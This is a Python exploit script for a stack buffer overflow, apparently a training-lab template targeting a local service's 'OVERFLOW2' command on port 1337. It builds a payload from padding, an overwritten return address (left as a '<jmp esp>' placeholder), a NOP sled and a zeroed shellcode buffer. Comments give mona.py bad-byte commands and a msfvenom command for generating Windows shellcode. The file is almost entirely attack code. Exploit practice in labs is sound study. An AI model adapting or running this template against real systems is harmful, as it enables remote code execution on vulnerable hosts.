#!/usr/bin/python3

import socket
import struct

s = socket.socket()
s.connect(("127.0.0.1", 1337))

# generate bytes for bad byte check:   for i in range(1,256): print('\\x%02X' % i, end='')
# repeat the two commands on mona.py as you encounter new bad bytes. 
# !mona bytearray -cpb "\x00\x0A\x0D"
# !mona compare -f C:\mona\bytearray.bin -a <eip>

total_length = 2000   #start:0x019AF7B0 end: 0x019AFF80
offset = 634
new_eip = struct.pack("<I", <jmp esp>)
nop_sled = b"\x90"*16

# For best practice: use thread to enter and exit without crashing the application
# replace shellcode below
# msfvenom -p windows/exec cmd=calc.exe LHOST=tun0 LPORT=8888 EXITFUNC=thread -b "\x00\x0A\x0D" -f py

buf =  b""
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00"


payload = [
    b"OVERFLOW2 ",
    b"A"*offset,
    new_eip,
    nop_sled,
    buf,
     b"C"*(total_length - offset - len(new_eip) - len(nop_sled) - len(buf))
]

payload = b"".join(payload)

s.send(payload)
s.close()
